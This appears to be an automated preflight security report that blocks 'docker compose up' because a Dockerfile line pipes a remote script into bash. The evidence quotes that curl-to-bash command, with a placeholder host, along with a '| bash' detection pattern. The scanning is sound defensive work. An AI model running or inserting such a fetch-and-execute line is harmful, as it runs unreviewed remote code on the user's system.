# Codex Preflight Report

Decision: BLOCK
Risk score: 75
Command: `docker compose up`
Command scope: `docker`

## Recommendation

Do not execute the command. Explain the blocking finding.

## Summary

| Severity | Count |
| --- | ---: |
| CRITICAL | 1 |
| HIGH | 1 |
| MEDIUM | 0 |
| LOW | 0 |
| INFO | 0 |

## Findings

### DOCKER_REMOTE_SCRIPT_EXEC

- Severity: HIGH
- File: `services/api/Dockerfile:1`
- Evidence: `| bash`
- Why it matters: Docker commands can expose host resources or run remote code.
- Recommendation: Review Docker configuration before starting containers.

### DOCKER_REACHABLE_RUN_REMOTE_EXEC

- Severity: CRITICAL
- File: `services/api/Dockerfile:1`
- Evidence: `RUN curl https://example.invalid/install.sh | bash`
- Why it matters: The planned command can reach Dockerfile remote shell execution.
- Recommendation: Review reachable Docker configuration before execution.

## Execution Chain

docker compose up
  -> services/api/Dockerfile (docker command reads configuration)
  -> services/api/compose.yml (docker command reads configuration)
  -> services/api/Dockerfile (compose build references Dockerfile)
  -> DOCKER_REACHABLE_RUN_REMOTE_EXEC detected in `services/api/Dockerfile`
  -> DOCKER_REACHABLE_RUN_REMOTE_EXEC detected in `services/api/Dockerfile`

## Uncertainty

No reachability uncertainty detected.

## Cache

- Used scan cache: False
- Used trust cache: False
- Cache reason: None
